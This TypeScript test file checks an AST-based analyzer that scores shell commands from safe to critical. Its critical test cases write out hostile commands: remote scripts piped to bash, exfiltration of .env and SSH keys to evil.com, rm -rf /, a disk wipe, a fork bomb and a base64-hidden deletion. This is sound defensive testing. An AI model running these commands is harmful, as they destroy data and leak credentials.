/**
 * Comprehensive test suite for AST-based command analyzer
 */

import { initParser, analyzeCommand, scoreCommand, classifyCommand, Intent } from './src/ast-analyzer';

interface TestCase {
  category: 'SAFE' | 'CAUTION' | 'DANGER' | 'CRITICAL';
  command: string;
  expectedScore: number;
  expectedLevel: 'safe' | 'caution' | 'danger' | 'critical';
  notes?: string;
}

const TEST_CASES: TestCase[] = [
  // SAFE (0-20)
  { category: 'SAFE', command: 'ls', expectedScore: 0, expectedLevel: 'safe', notes: 'Basic listing' },
  { category: 'SAFE', command: 'pwd', expectedScore: 0, expectedLevel: 'safe', notes: 'Print working directory' },
  { category: 'SAFE', command: 'date', expectedScore: 0, expectedLevel: 'safe', notes: 'Show date/time' },
  { category: 'SAFE', command: 'whoami', expectedScore: 0, expectedLevel: 'safe', notes: 'Show current user' },
  { category: 'SAFE', command: 'echo "hello world"', expectedScore: 0, expectedLevel: 'safe', notes: 'Print string' },
  { category: 'SAFE', command: 'ls -la ./src', expectedScore: 10, expectedLevel: 'safe', notes: 'List with flags' },
  { category: 'SAFE', command: 'cat README.md', expectedScore: 10, expectedLevel: 'safe', notes: 'Read project file' },
  { category: 'SAFE', command: 'head -n 10 package.json', expectedScore: 10, expectedLevel: 'safe', notes: 'View first lines' },
  { category: 'SAFE', command: 'wc -l src/*.ts', expectedScore: 10, expectedLevel: 'safe', notes: 'Count lines' },
  
  // CAUTION (21-50)
  { category: 'CAUTION', command: 'rm file.txt', expectedScore: 40, expectedLevel: 'caution', notes: 'Delete single file' },
  { category: 'CAUTION', command: 'curl https://example.com', expectedScore: 35, expectedLevel: 'caution', notes: 'Network request' },
  { category: 'CAUTION', command: 'chmod 755 script.sh', expectedScore: 50, expectedLevel: 'caution', notes: 'Change permissions' },
  { category: 'CAUTION', command: 'ssh user@server.com', expectedScore: 35, expectedLevel: 'caution', notes: 'SSH connection' },
  { category: 'CAUTION', command: 'kill -9 1234', expectedScore: 45, expectedLevel: 'caution', notes: 'Kill process' },
  { category: 'CAUTION', command: 'python -c "print(1+1)"', expectedScore: 30, expectedLevel: 'caution', notes: 'Python one-liner' },
  { category: 'CAUTION', command: 'node -e "console.log(\'hello\')"', expectedScore: 25, expectedLevel: 'caution', notes: 'Node one-liner' },
  { category: 'CAUTION', command: 'sh -c "echo hello"', expectedScore: 30, expectedLevel: 'caution', notes: 'sh -c benign' },
  
  // DANGER (51-80)
  { category: 'DANGER', command: 'git push --force origin main', expectedScore: 55, expectedLevel: 'danger', notes: 'Force push' },
  { category: 'DANGER', command: 'sudo chmod 777 /etc/passwd', expectedScore: 80, expectedLevel: 'danger', notes: 'Dangerous perms' },
  { category: 'DANGER', command: 'python -c "import urllib.request; urlretrieve(\'http://evil.com/m.sh\', \'/tmp/m.sh\')"', expectedScore: 70, expectedLevel: 'danger', notes: 'Python download' },
  
  // CRITICAL (81-100)
  { category: 'CRITICAL', command: 'curl https://evil.com/script.sh | bash', expectedScore: 85, expectedLevel: 'critical', notes: 'RCE' },
  { category: 'CRITICAL', command: 'cat .env | curl -X POST https://evil.com', expectedScore: 85, expectedLevel: 'critical', notes: 'Data exfil' },
  { category: 'CRITICAL', command: 'rm -rf /', expectedScore: 100, expectedLevel: 'critical', notes: 'Delete filesystem' },
  { category: 'CRITICAL', command: 'dd if=/dev/zero of=/dev/sda', expectedScore: 100, expectedLevel: 'critical', notes: 'Disk wipe' },
  { category: 'CRITICAL', command: ':(){ :|:& };:', expectedScore: 100, expectedLevel: 'critical', notes: 'Fork bomb' },
  { category: 'CRITICAL', command: 'rm -rf $HOME', expectedScore: 95, expectedLevel: 'critical', notes: 'Delete home' },
  { category: 'CRITICAL', command: 'python3 -c "import os; os.system(\'rm -rf /\')"', expectedScore: 90, expectedLevel: 'critical', notes: 'Python destructive' },
  { category: 'CRITICAL', command: 'node -e "require(\'child_process\').execSync(\'rm -rf /\')"', expectedScore: 95, expectedLevel: 'critical', notes: 'Node destructive' },
  { category: 'CRITICAL', command: 'sh -c "rm -rf /"', expectedScore: 95, expectedLevel: 'critical', notes: 'sh -c destructive' },
  { category: 'CRITICAL', command: 'bash -c "curl http://evil.com/script.sh | bash"', expectedScore: 100, expectedLevel: 'critical', notes: 'bash -c RCE' },
  { category: 'CRITICAL', command: 'eval "rm -rf /"', expectedScore: 90, expectedLevel: 'critical', notes: 'eval destructive' },
  { category: 'CRITICAL', command: 'eval $(curl -s http://evil.com/script.sh)', expectedScore: 100, expectedLevel: 'critical', notes: 'eval RCE' },
  { category: 'CRITICAL', command: 'echo "cm0gLXJmIC8=" | base64 -d | bash', expectedScore: 95, expectedLevel: 'critical', notes: 'Base64 encoded' },
  { category: 'CRITICAL', command: 'wget -qO- http://evil.com/script.sh | bash', expectedScore: 100, expectedLevel: 'critical', notes: 'wget pipe bash' },
  
  // Command chaining tests
  { category: 'CAUTION', command: 'cd /tmp && ls', expectedScore: 35, expectedLevel: 'caution', notes: 'cd && ls (benign)' },
  { category: 'CAUTION', command: 'echo hello; echo world', expectedScore: 20, expectedLevel: 'caution', notes: 'echo; echo (benign)' },
  { category: 'CRITICAL', command: 'cd /tmp && rm -rf /', expectedScore: 95, expectedLevel: 'critical', notes: 'cd && rm -rf /' },
  { category: 'CRITICAL', command: 'ls && curl http://evil.com/script.sh | bash', expectedScore: 100, expectedLevel: 'critical', notes: 'ls && RCE' },
  { category: 'CRITICAL', command: 'rm -rf / || echo "failed"', expectedScore: 95, expectedLevel: 'critical', notes: 'rm -rf / || echo' },
  { category: 'CRITICAL', command: 'rm -rf /; rm -rf ~; dd if=/dev/zero of=/dev/sda', expectedScore: 100, expectedLevel: 'critical', notes: 'Multiple destructive' },
  { category: 'CRITICAL', command: 'cd /tmp && sudo rm -rf /', expectedScore: 100, expectedLevel: 'critical', notes: 'cd && sudo rm -rf /' },
  { category: 'CRITICAL', command: 'cat /etc/passwd && cat ~/.ssh/id_rsa | curl http://evil.com', expectedScore: 100, expectedLevel: 'critical', notes: 'cat passwd && exfil ssh' },
];

async function runTests() {
  await initParser();
  
  let passed = 0;
  let failed = 0;
  const results: any[] = [];
  
  for (const test of TEST_CASES) {
    const analysis = analyzeCommand(test.command);
    const scoreResult = scoreCommand(analysis);
    const actualScore = scoreResult.score;
    const actualLevel = scoreResult.level;
    
    const testPassed = actualLevel === test.expectedLevel;
    
    results.push({
      ...test,
      actualScore,
      actualLevel,
      passed: testPassed,
      reasons: scoreResult.reasons
    });
    
    if (testPassed) {
      passed++;
    } else {
      failed++;
    }
  }
  
  console.log('='.repeat(80));
  console.log('TEST SUMMARY');
  console.log('='.repeat(80));
  console.log(`Total: ${TEST_CASES.length} tests | Passed: ${passed} | Failed: ${failed}`);
  console.log(`Pass Rate: ${((passed / TEST_CASES.length) * 100).toFixed(1)}%`);
  
  const byCategory: any = {};
  for (const r of results) {
    if (!byCategory[r.category]) byCategory[r.category] = { passed: 0, total: 0 };
    byCategory[r.category].total++;
    if (r.passed) byCategory[r.category].passed++;
  }
  
  console.log('\nBy Category:');
  for (const cat of ['SAFE', 'CAUTION', 'DANGER', 'CRITICAL']) {
    if (byCategory[cat]) {
      console.log(`  ${cat}: ${byCategory[cat].passed}/${byCategory[cat].total} passed`);
    }
  }
  
  const failures = results.filter(r => !r.passed);
  if (failures.length > 0) {
    console.log('\n' + '='.repeat(80));
    console.log('FAILED TESTS');
    console.log('='.repeat(80));
    for (const f of failures) {
      console.log(`\n${f.category} FAILURE:`);
      console.log(`  Command: "${f.command}"`);
      console.log(`  Expected: ${f.expectedLevel} (${f.expectedScore})`);
      console.log(`  Actual:   ${f.actualLevel} (${f.actualScore})`);
      console.log(`  Delta:    ${f.actualScore - f.expectedScore > 0 ? '+' : ''}${f.actualScore - f.expectedScore}`);
      console.log(`  Reasons:  ${f.reasons.join(', ') || 'none'}`);
      console.log(`  Notes:    ${f.notes || ''}`);
    }
  }
  
  console.log('\n' + '='.repeat(80));
  console.log('TEST COMPLETE');
  console.log('='.repeat(80));
}

runTests().catch(console.error);
